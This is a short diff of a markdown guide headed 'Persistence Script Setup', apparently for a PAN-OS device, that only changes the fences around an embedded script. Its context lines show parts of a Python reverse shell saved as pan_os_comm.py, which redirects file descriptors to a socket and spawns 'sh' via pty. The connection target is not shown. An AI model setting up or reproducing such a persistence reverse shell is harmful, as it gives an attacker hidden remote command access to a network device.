@@ -18,7 +18,7 @@ Persistence Script Setup:
 1. Perform the following command: nano pan_os_comm.py
 2. In nano, copy and paste the below script:
 
-'''
+```
 #!/usr/bin/env python3
 
 import socket
@@ -38,7 +38,7 @@ os.dup2(s.fileno(), 2)
 
 pty.spawn("sh")
 
-'''
+```
 
 
 
